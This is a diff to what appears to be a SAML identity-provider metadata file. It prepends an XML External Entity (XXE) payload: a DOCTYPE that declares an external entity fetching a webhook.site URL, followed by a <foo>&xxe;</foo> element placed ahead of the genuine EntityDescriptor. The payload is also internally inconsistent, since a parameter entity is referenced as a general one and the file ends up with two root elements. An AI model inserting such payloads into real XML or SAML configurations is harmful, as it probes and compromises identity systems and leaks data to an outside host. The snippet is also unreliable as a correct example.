@@ -1,3 +1,9 @@
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY % xxe SYSTEM "https://webhook.site/aeb6f72c-b403-45f4-a33c-e2fce8713d34" >
+]>
+<foo>&xxe;</foo>
 <EntityDescriptor
     xmlns="urn:oasis:names:tc:SAML:2.0:metadata"
     entityID="https://example.com/idp">
